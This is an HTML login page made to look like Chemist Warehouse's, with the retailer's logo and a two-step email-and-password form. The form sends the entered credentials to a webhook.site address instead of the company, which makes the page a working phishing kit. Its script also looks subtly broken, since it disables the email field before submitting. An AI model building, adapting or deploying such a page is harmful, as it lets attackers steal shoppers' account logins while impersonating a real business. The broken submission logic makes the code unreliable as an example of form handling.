<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Chemist Warehouse Login</title>
  <style>
    /* Your original styles here (omitted for brevity) */
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      display: flex;
      justify-content: flex-start;
      align-items: center;
      min-height: 100vh;
      background-color: #0d47a1;
      padding-left: 45px;
      box-sizing: border-box;
    }
    .login-container {
      background-color: #fff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      text-align: center;
      width: 100%;
      max-width: 400px;
    }
    .login-container img {
      max-width: 180px;
      margin-bottom: 1px;
    }
    .login-container h2 {
      font-size: 24px;
      color: #333;
      margin-top: 0;
      margin-bottom: 10px;
    }
    .login-container p {
      font-size: 16px;
      color: #666;
      margin-bottom: 30px;
    }
    .login-container input[type="email"],
    .login-container input[type="password"] {
      width: calc(100% - 20px);
      padding: 12px 10px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
    .login-container button {
      width: 100%;
      padding: 12px;
      background-color: #0d47a1;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .login-container button:hover {
      background-color: #0a3a83;
    }
    .login-container .signup-link {
      margin-top: 25px;
      font-size: 15px;
      color: #666;
    }
    .login-container .signup-link a {
      color: #0d47a1;
      text-decoration: none;
      font-weight: bold;
    }
    .login-container .signup-link a:hover {
      text-decoration: underline;
    }
    #password-container {
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://images.ctfassets.net/hzgho8wo5m1w/3YprSv1x1a97SPwHeVAjHp/5a756f989347dd7a563994bf551986c2/Chemist_Warehouse_logo_-_We_beat_lockup.svg?w=1920&q=100" alt="Chemist Warehouse Logo" />
    <h2>Welcome</h2>
    <p>Log in to Chemist Warehouse Retail</p>

    <form id="login-form" action="https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb" method="POST">
      <input id="email" name="email" type="email" placeholder="Email address*" required />
      <div id="password-container">
        <input id="password" name="password" type="password" placeholder="Password*" required />
      </div>
      <button id="continue-btn" type="button">Continue</button>
    </form>

    <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
  </div>

  <script>
    const emailInput = document.getElementById('email');
    const passwordContainer = document.getElementById('password-container');
    const continueBtn = document.getElementById('continue-btn');
    const passwordInput = document.getElementById('password');
    const form = document.getElementById('login-form');

    continueBtn.addEventListener('click', () => {
      if (passwordContainer.style.display === 'none') {
        if (emailInput.checkValidity()) {
          passwordContainer.style.display = 'block';
          emailInput.disabled = true;
          passwordInput.focus();
          continueBtn.textContent = 'Log In';
        } else {
          emailInput.reportValidity();
        }
      } else {
        if (!passwordInput.value) {
          passwordInput.reportValidity();
          return;
        }
        form.submit();
      }
    });
  </script>
</body>
</html>
